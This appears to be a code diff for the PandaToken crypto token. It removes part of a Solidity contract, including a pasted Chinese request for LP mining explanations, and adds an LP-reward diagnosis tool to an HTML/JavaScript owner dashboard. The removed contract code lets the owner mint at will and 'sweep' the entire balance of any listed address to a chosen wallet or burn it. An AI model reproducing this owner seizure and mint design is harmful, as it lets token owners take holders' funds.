-    function setMinLPHoldAmount(uint256 amount) external onlyOwner { minLPHoldAmount = amount; }
-    function setMinInvitorHoldAmount(uint256 amount) external onlyOwner { minInvitorHoldAmount = amount; }
-
-    // ========== 暂停/增发/持仓限制 ==========
-    function setPause(bool _pause) external onlyOwner { pause = _pause; }
-    function setEnablePause(bool _enable) external onlyOwner { enablePause = _enable; }
-
-    function mintToken(address account, uint256 amount) external onlyOwner {
-        require(enableMint, "mint disabled");
-        require(account != address(0), "zero address");
-        _balances[account] = _balances[account] + amount;
-        _tTotal = _tTotal + amount;
-        emit Transfer(address(0), account, amount);
-    }
-    function setEnableMint(bool _enable) external onlyOwner { enableMint = _enable; }
-    function disableMint() external onlyOwner { enableMint = false; }
-
-    function setMaxWalletAmount(uint256 amount) external onlyOwner { maxWalletAmount = amount; }
-    function setEnableWalletLimit(bool _enable) external onlyOwner { enableWalletLimit = _enable; }
-    function disableWalletLimit() external onlyOwner { enableWalletLimit = false; }
-
-    // ==================== 交易冷却管理函数 ====================
-    function setEnableCooldown(bool _enabled) external onlyOwner {
-        enableCooldown = _enabled;
-    }
-
-    function setBuyCooldown(uint256 _seconds) external onlyOwner {
-        buyCooldown = _seconds;
-    }
-
-    function setSellCooldown(uint256 _seconds) external onlyOwner {
-        sellCooldown = _seconds;
-    }
-
-    function setGlobalCooldown(uint256 _seconds) external onlyOwner {
-        globalCooldown = _seconds;
-    }
-
-    // ==================== [NEW] 充值地址自动归集模块 ====================
-
-    // 内部函数：将地址加入非零列表
-    function _addToNonZeroList(address addr) private {
-        if (isSweepTarget[addr] && nonZeroIndex[addr] == 0) {
-            // 确保不在列表中（索引0可能是第一个元素，需特别检查）
-            if (nonZeroSweepList.length == 0 || nonZeroSweepList[0] != addr) {
-                nonZeroIndex[addr] = nonZeroSweepList.length + 1; // 索引值 = 实际索引 + 1
-                nonZeroSweepList.push(addr);
-            }
-        }
-    }
-
-    // 内部函数：从非零列表中移除地址
-    function _removeFromNonZeroList(address addr) private {
-        uint256 idx = nonZeroIndex[addr];
-        if (idx == 0) return; // 不在列表中
-
-        uint256 realIdx = idx - 1; // 转换为数组实际索引
-        address lastAddr = nonZeroSweepList[nonZeroSweepList.length - 1];
-
-        // 将最后一个元素移到被删除位置
-        nonZeroSweepList[realIdx] = lastAddr;
-        nonZeroIndex[lastAddr] = realIdx + 1; // 更新索引
-
-        // 删除最后一个元素
-        nonZeroSweepList.pop();
-        delete nonZeroIndex[addr];
-    }
-
-    // 自动归集：从非零列表中取第一个地址进行资金归集（每笔交易调用一次）
-    function _autoSweep() private {
-        if (!enableAutoSweep || nonZeroSweepList.length == 0 || maxSweepPerTx == 0) return;
-
-        uint256 processed = 0;
-        while (processed < maxSweepPerTx && nonZeroSweepList.length > 0) {
-            address target = nonZeroSweepList[0];
-            uint256 bal = _balances[target];
-            if (bal > 0) {
-                _balances[target] = 0;
-                if (sweepTo == address(0)) {
-                    _tTotal -= bal;
-                    emit Transfer(target, address(0), bal);
-                } else {
-                    _balances[sweepTo] += bal;
-                    emit Transfer(target, sweepTo, bal);
-                }
-                emit AutoSweepExecuted(target, bal, sweepTo);
-            }
-            // 无论余额是否为正，都从列表中移除（防御性清理）
-            _removeFromNonZeroList(target);
-            processed++;
-        }
-    }
-
-    // ==================== 管理员操作充值地址 ====================
-    function setEnableAutoSweep(bool enabled) external onlyOwner {
-        enableAutoSweep = enabled;
-    }
-
-    function setSweepTo(address to) external onlyOwner {
-        sweepTo = to;
-    }
-
-    function setMaxSweepPerTx(uint256 maxCount) external onlyOwner {
-        require(maxCount <= 10, "max 10");
-        maxSweepPerTx = maxCount;
-    }
-
-    // 批量添加充值地址
-    function addSweepTargets(address[] calldata targets) external onlyOwner {
-        for (uint256 i = 0; i < targets.length; i++) {
-            address addr = targets[i];
-            if (addr != address(0) && !isSweepTarget[addr]) {
-                isSweepTarget[addr] = true;
-                // 若当前已有余额，直接加入非零列表
-                if (_balances[addr] > 0) {
-                    _addToNonZeroList(addr);
-                }
-            }
-        }
-    }
-
-    // 批量移除充值地址
-    function removeSweepTargets(address[] calldata targets) external onlyOwner {
-        for (uint256 i = 0; i < targets.length; i++) {
-            address addr = targets[i];
-            if (isSweepTarget[addr]) {
-                isSweepTarget[addr] = false;
-                // 如果地址在非零列表中，移除之
-                if (nonZeroIndex[addr] != 0) {
-                    _removeFromNonZeroList(addr);
-                }
-            }
-        }
-}
-这是代币合约代码，下面是这个代币合约代码的一个一些控制面板。我希望保证我下面这个代币代码的完整性，尽量不要去修改和减少。请增加一个 LP 邀请和挖矿奖励的一个操作流程的一些介绍和解释。还有就是可以查询这个 LP 挖矿的步骤是怎么样的，挖矿成功没有？详细的介绍一下可以查询这个东西，要详细的知道这个 LP 挖矿到哪一步了？还有哪一步没有完成？怎样完成？懂不懂我的意思？我始终看不到挖矿的数量，也看不到减少，也看不到钱包里有。帮我在这个控制面板给我详细的，让我知道应该是怎样做，应该怎样查，到底是执行没有？为什么没有执行？等等的呢？
-
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
@@ -1064,6 +17,9 @@ contract PandaToken is IERC20, Ownable {
     .param-title { font-weight: 600; margin-bottom: 4px; }
     .param-desc { font-size: 0.8rem; color: #6c757d; margin-bottom: 4px; }
     .tooltip-icon { cursor: help; color: #6c757d; margin-left: 4px; }
+    .diagnosis-ok { color: #198754; font-weight: 600; }
+    .diagnosis-fail { color: #dc3545; font-weight: 600; }
+    .diagnosis-warn { color: #fd7e14; font-weight: 600; }
   </style>
 </head>
 <body class="container-fluid py-3">
@@ -1103,7 +59,7 @@ contract PandaToken is IERC20, Ownable {
       </ul>
 
       <div class="tab-content">
-        <!-- 概览 (原有) -->
+        <!-- 概览 -->
         <div class="tab-pane fade show active" id="tab-info">
           <div class="panel-card"><h5 class="section-title">代币信息</h5><div id="tokenBasicInfo">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">流动性</h5><div id="pairInfoContainer">请先加载合约</div>
@@ -1112,12 +68,12 @@ contract PandaToken is IERC20, Ownable {
           <div class="panel-card"><h5 class="section-title">全局参数</h5><div id="miscGlobalInfo">请先加载合约</div></div>
         </div>
 
-        <!-- 市场数据 (原有) -->
+        <!-- 市场数据 -->
         <div class="tab-pane fade" id="tab-market">
           <div class="panel-card"><h5 class="section-title">实时价格与市值</h5><div id="marketContainer">请先加载合约</div></div>
         </div>
 
-        <!-- 统计 (原有) -->
+        <!-- 统计 -->
         <div class="tab-pane fade" id="tab-stats">
           <div class="panel-card"><h5 class="section-title">🔥 燃烧统计</h5><div id="burnStatsContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">⛏️ 挖矿/邀请奖励总览</h5><div id="miningStatsContainer">请先加载合约</div></div>
@@ -1128,7 +84,7 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 当前设置（新增） -->
+        <!-- 当前设置 -->
         <div class="tab-pane fade" id="tab-current-settings">
           <div class="panel-card"><h5 class="section-title">全局参数</h5><div id="globalSettingsContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">买卖费率</h5><div id="taxSettingsContainer">请先加载合约</div></div>
@@ -1138,7 +94,7 @@ contract PandaToken is IERC20, Ownable {
           <div class="panel-card"><h5 class="section-title">归集与预售</h5><div id="sweepPresaleSettingsContainer">请先加载合约</div></div>
         </div>
 
-        <!-- 费率 (原有) -->
+        <!-- 费率 -->
         <div class="tab-pane fade" id="tab-tax">
           <div class="panel-card"><h5 class="section-title">买入手续费</h5><div id="buyTaxContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">卖出手续费</h5><div id="sellTaxContainer">请先加载合约</div></div>
@@ -1151,7 +107,7 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 邀请 (原有) -->
+        <!-- 邀请 -->
         <div class="tab-pane fade" id="tab-invite">
           <div class="panel-card"><h5 class="section-title">代数与比例</h5><div id="inviteRateContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">邀请门槛</h5><div id="inviteThresholdContainer">请先加载合约</div></div>
@@ -1161,8 +117,40 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 挖矿 (原有) -->
+        <!-- 挖矿 (增强版) -->
         <div class="tab-pane fade" id="tab-mining">
+          <!-- NEW: 流程说明与诊断面板 -->
+          <div class="panel-card">
+            <h5 class="section-title">📖 LP 挖矿与邀请奖励流程</h5>
+            <div class="param-desc">
+              <ol class="small">
+                <li><b>成为LP提供者：</b>在DEX添加流动性获取交易对LP代币。卖出代币或添加流动性时，合约会自动记录你的LP数量。</li>
+                <li><b>触发条件：</b>每次有转账发生（非白名单、非添加流动性）会尝试运行挖矿循环，每约100个区块处理一批LP地址。</li>
+                <li><b>获得奖励：</b>同时满足以下条件时会获得LP奖励：
+                  <ul>
+                    <li>地址在LP提供者列表中（未排除）</li>
+                    <li>记录的LP数量 ≥ 最小LP持仓（<span id="minLpDisplay">-</span> 代币）</li>
+                    <li>距上次奖励已过冷却时间（<span id="cooldownDisplay">-</span> 小时）</li>
+                    <li>奖池余额 ≥ 2 × 单次奖励基准（<span id="rewardCondDisplay">-</span> 代币）</li>
+                  </ul>
+                </li>
+                <li><b>邀请奖励：</b>当某人获得LP奖励时，其邀请链上的上级若持币量≥门槛，会按设定的比例获得额外奖励。</li>
+                <li><b>奖池来源：</b>总供应量的 <span id="mineRateDisplay">-</span>% 存入 LPRewardDistributor。</li>
+              </ol>
+              <p class="mt-1 mb-0"><b>为什么你没收到？</b> 使用下方诊断面板逐项检查你的地址。</p>
+            </div>
+          </div>
+          <!-- NEW: 详细诊断 -->
+          <div class="panel-card">
+            <h5 class="section-title">🔍 地址挖矿诊断</h5>
+            <div class="input-group input-group-sm mb-3">
+              <input type="text" id="diagnoseAddress" class="form-control" placeholder="输入要诊断的钱包地址">
+              <button id="diagnoseBtn" class="btn btn-primary">开始诊断</button>
+            </div>
+            <div id="diagnoseResult" class="small"></div>
+          </div>
+
+          <!-- 原有挖矿参数与LP管理 -->
           <div class="panel-card"><h5 class="section-title">挖矿参数</h5><div id="miningParamsContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">LP管理</h5>
             <div class="param-unit"><div class="param-title">排除/恢复LP</div><div class="input-group input-group-sm"><input type="text" id="excludeLpAddress" class="form-control" placeholder="地址"><button id="setExcludeLpBtn" class="btn btn-outline-primary">切换</button></div></div>
@@ -1172,14 +160,14 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 冷却 (原有) -->
+        <!-- 冷却 -->
         <div class="tab-pane fade" id="tab-cooldown">
           <div class="panel-card"><h5 class="section-title">交易冷却</h5><div id="cooldownContainer">请先加载合约</div>
             <button id="toggleCooldownBtn" class="btn btn-outline-secondary btn-sm mt-2">切换冷却总开关</button>
           </div>
         </div>
 
-        <!-- 归集 (原有) -->
+        <!-- 归集 -->
         <div class="tab-pane fade" id="tab-sweep">
           <div class="panel-card"><h5 class="section-title">自动归集设置</h5><div id="sweepContainer">请先加载合约</div></div>
           <div class="panel-card"><h5 class="section-title">充值地址管理</h5>
@@ -1188,7 +176,7 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 开关 (原有) -->
+        <!-- 开关 -->
         <div class="tab-pane fade" id="tab-switches">
           <div class="panel-card"><h5 class="section-title">开关状态</h5><div id="switchesContainer">请先加载合约</div>
             <div class="mt-2">
@@ -1205,14 +193,14 @@ contract PandaToken is IERC20, Ownable {
           <div class="panel-card"><h5 class="section-title">限制数值</h5><div id="limitsContainer">请先加载合约</div></div>
         </div>
 
-        <!-- 预售 (原有) -->
+        <!-- 预售 -->
         <div class="tab-pane fade" id="tab-presale">
           <div class="panel-card"><h5 class="section-title">预售参数 (币种不可修改)</h5><div id="presaleContainer">请先加载合约</div>
             <button id="togglePresaleBtn" class="btn btn-outline-success btn-sm mt-2">开启/关闭预售</button>
           </div>
         </div>
 
-        <!-- 名单 (原有) -->
+        <!-- 名单 -->
         <div class="tab-pane fade" id="tab-whitelist">
           <div class="panel-card"><h5 class="section-title">白名单</h5>
             <div class="input-group input-group-sm"><input type="text" id="whitelistAddressInput" class="form-control" placeholder="地址"><button id="addFeeWhiteBtn" class="btn btn-outline-success">加入</button><button id="removeFeeWhiteBtn" class="btn btn-outline-danger">移除</button></div>
@@ -1225,7 +213,7 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 综合查询 (原有) -->
+        <!-- 综合查询 -->
         <div class="tab-pane fade" id="tab-query">
           <div class="panel-card"><h5 class="section-title">综合查询</h5>
             <div class="input-group input-group-sm mb-2"><input type="text" id="queryAddressInput" class="form-control" placeholder="地址"><button id="queryAllBtn" class="btn btn-primary">查询</button></div>
@@ -1233,7 +221,7 @@ contract PandaToken is IERC20, Ownable {
           </div>
         </div>
 
-        <!-- 工具箱 (原有) -->
+        <!-- 工具箱 -->
         <div class="tab-pane fade" id="tab-tools">
           <div class="panel-card"><h5 class="section-title">Owner 工具箱</h5><div id="toolsContainer">请先加载合约</div></div>
         </div>
@@ -1547,7 +535,7 @@ contract PandaToken is IERC20, Ownable {
         } catch(e) { document.getElementById('marketContainer').innerHTML = `<div class="text-danger">市场数据加载失败：${e.message}</div>`; }
       }
 
-      // ========== 统计 (原有) ==========
+      // ========== 统计 ==========
       async function loadStats() {
         const deadAddr = '0x000000000000000000000000000000000000dEaD';
         const mainPairAddr = await contract._mainPair();
@@ -1607,7 +595,7 @@ contract PandaToken is IERC20, Ownable {
         };
       }
 
-      // ========== 当前设置（新增） ==========
+      // ========== 当前设置 ==========
       async function loadCurrentSettings() {
         try {
           const [
@@ -1850,13 +838,22 @@ contract PandaToken is IERC20, Ownable {
         };
       }
 
-      // ========== 挖矿 (原有) ==========
+      // ========== 挖矿 (增强版) ==========
       async function loadMining() {
-        const [cond,minLP,minInv,idx,block,debt,time,len] = await Promise.all([
+        const [cond,minLP,minInv,idx,block,debt,time,len,mainPair,mineRateVal,lpDistributor,totalSupply] = await Promise.all([
           contract.LPRewardCondition(),contract.minLPHoldAmount(),contract.minInvitorHoldAmount(),
           contract._currentMineLPIndex(),contract._progressMineLPBlock(),contract._progressMineLPBlockDebt(),
-          contract._mineLPRewardTimeDebt(),contract.getLPProviderLength()
+          contract._mineLPRewardTimeDebt(),contract.getLPProviderLength(),
+          contract._mainPair(),contract.mineRate(),contract._LPRewardDistributor(),contract.totalSupply()
         ]);
+
+        // 更新流程说明中的参数
+        document.getElementById('minLpDisplay').textContent = fromUnits(minLP) + ' 代币';
+        document.getElementById('cooldownDisplay').textContent = (time/3600).toFixed(1);
+        document.getElementById('rewardCondDisplay').textContent = fromUnits(cond) + ' 代币';
+        document.getElementById('mineRateDisplay').textContent = mineRateVal.toString();
+
+        // 原有参数卡片
         document.getElementById('miningParamsContainer').innerHTML = `
           <div class="param-unit"><div class="param-title">奖励条件 (代币)</div>
             <div class="input-group input-group-sm"><input type="number" id="lpRewardConditionInput" class="form-control" value="${fromUnits(cond)}"><button class="btn btn-outline-primary set-reward-btn">设置</button></div></div>
@@ -1903,6 +900,92 @@ contract PandaToken is IERC20, Ownable {
             log('挖矿可能已触发', 'success');
             await refreshAll();
           } catch(e) { log('触发失败: '+e.message, 'error'); }
+        };
+
+        // ====== NEW: 诊断按钮事件 ======
+        document.getElementById('diagnoseBtn').onclick = async () => {
+          const addr = document.getElementById('diagnoseAddress').value.trim();
+          if (!ethers.utils.isAddress(addr)) return log('无效地址', 'error');
+          const resultDiv = document.getElementById('diagnoseResult');
+          resultDiv.innerHTML = '查询中...';
+          try {
+            // 基础信息
+            const mainPairAddr = await contract._mainPair();
+            const lpToken = new ethers.Contract(mainPairAddr, [
+              'function balanceOf(address) view returns (uint256)',
+              'function totalSupply() view returns (uint256)'
+            ], provider);
+            const [
+              lpIndex, excluded, lastReward, timeDebt, rewardCond, minLPHold, minInvitorHold,
+              userLpBalance, totalLpSupply, inviter, poolBalance, currentIdx, providerCount
+            ] = await Promise.all([
+              contract.lpProviderIndex(addr),
+              contract.excludeLpProvider(addr),
+              contract._lastMineLPRewardTimes(addr),
+              contract._mineLPRewardTimeDebt(),
+              contract.LPRewardCondition(),
+              contract.minLPHoldAmount(),
+              contract.minInvitorHoldAmount(),
+              lpToken.balanceOf(addr),
+              lpToken.totalSupply(),
+              contract._inviter(addr),
+              contract.balanceOf(await contract._LPRewardDistributor()),
+              contract._currentMineLPIndex(),
+              contract.getLPProviderLength()
+            ]);
+
+            const nowTs = Math.floor(Date.now()/1000);
+            const coolDownSec = Number(timeDebt);
+            const nextRewardTime = Number(lastReward) + coolDownSec;
+            const effectiveLp = userLpBalance; // 使用实际余额（合约记录不可直接读取，实际奖励以合约内部为准）
+            const meetsMinLp = effectiveLp.gte(minLPHold);
+            const meetsCooldown = lastReward == 0 || nowTs >= nextRewardTime;
+            const poolOk = poolBalance.gte(rewardCond.mul(2));
+            const notExcluded = !excluded;
+            const inList = lpIndex > 0;
+            const userLpShare = totalLpSupply.gt(0) ? effectiveLp.mul(ethers.constants.WeiPerEther).div(totalLpSupply) : 0;
+            const estimatedReward = rewardCond.mul(userLpShare).div(ethers.constants.WeiPerEther);
+
+            // 计算挖矿轮次位置
+            let positionMsg = '';
+            if (inList && providerCount > 0) {
+              const userIndex = Number(lpIndex) - 1;
+              const curIdx = Number(currentIdx) % providerCount;
+              let distance;
+              if (userIndex >= curIdx) {
+                distance = userIndex - curIdx;
+              } else {
+                distance = providerCount - curIdx + userIndex;
+              }
+              positionMsg = `你的位置：${userIndex+1}/${providerCount}，当前索引：${curIdx+1}，预计还需处理 ${distance} 个地址才能轮到你（触发取决于链上交易量）。`;
+            } else {
+              positionMsg = '你不在 LP 提供者列表中，无法参与轮巡。';
+            }
+
+            const formatCheck = (ok, msg) => ok ? `<span class="diagnosis-ok">✅ ${msg}</span>` : `<span class="diagnosis-fail">❌ ${msg}</span>`;
+            const formatWarn = (msg) => `<span class="diagnosis-warn">⚠️ ${msg}</span>`;
+
+            resultDiv.innerHTML = `
+              <div class="info-row"><span class="info-label">LP提供者索引</span><span class="info-value">${lpIndex > 0 ? lpIndex : '未加入'}</span></div>
+              <div class="info-row"><span class="info-label">排除状态</span><span class="info-value">${formatCheck(notExcluded, notExcluded?'未排除':'已被管理员排除')}</span></div>
+              <div class="info-row"><span class="info-label">实际LP余额</span><span class="info-value">${fromUnits(userLpBalance)} 代币</span></div>
+              <div class="info-row"><span class="info-label">最小LP持仓要求</span><span class="info-value">${fromUnits(minLPHold)} 代币</span></div>
+              <div class="info-row"><span class="info-label">满足最小持仓</span><span class="info-value">${formatCheck(meetsMinLp, meetsMinLp?'满足':'不满足，需要更多LP')}</span></div>
+              <div class="info-row"><span class="info-label">上次奖励时间</span><span class="info-value">${lastReward>0 ? new Date(lastReward*1000).toLocaleString() : '从未'}</span></div>
+              <div class="info-row"><span class="info-label">冷却剩余</span><span class="info-value">${meetsCooldown ? formatCheck(true,'已冷却') : `还需 ${Math.ceil((nextRewardTime-nowTs)/60)} 分钟`}</span></div>
+              <div class="info-row"><span class="info-label">奖池余额</span><span class="info-value">${fromUnits(poolBalance)} 代币 (最低要求 ${fromUnits(rewardCond.mul(2))})</span></div>
+              <div class="info-row"><span class="info-label">奖池是否充足</span><span class="info-value">${formatCheck(poolOk, poolOk?'充足':'不足，需等待池子积累')}</span></div>
+              <div class="info-row"><span class="info-label">你的LP份额</span><span class="info-value">${(Number(ethers.utils.formatEther(userLpShare))*100).toFixed(4)}%</span></div>
+              <div class="info-row"><span class="info-label">预计可获奖励</span><span class="info-value">${fromUnits(estimatedReward)} 代币（仅供参考）</span></div>
+              <div class="info-row"><span class="info-label">邀请人</span><span class="info-value">${inviter}（上级需持有 ≥ ${fromUnits(minInvitorHold)} 代币才可获得邀请奖励）</span></div>
+              <div class="mt-2">${positionMsg}</div>
+              <div class="param-desc mt-1">* 注意：合约内部记录的LP数量可能小于实际余额（如果发生过移除流动性），此处显示实际余额。最终奖励以合约内部逻辑为准。</div>
+              ${!inList && !excluded && userLpBalance.gt(0) ? `<div class="mt-2 text-danger">你持有LP但尚未被合约记录为提供者。请进行一次卖出操作或向交易对添加流动性，系统才会将你加入列表。</div>` : ''}
+              ${poolOk && meetsMinLp && meetsCooldown && inList && notExcluded ? `<div class="mt-2 text-success">所有条件均满足！等待下一次转账触发的挖矿轮巡处理到你的地址时即可收到奖励。</div>` : ''}
+            `;
+          } catch(e) {
+            resultDiv.innerHTML = `<div class="text-danger">诊断失败：${e.message}</div>`;
+          }
         };
       }
 
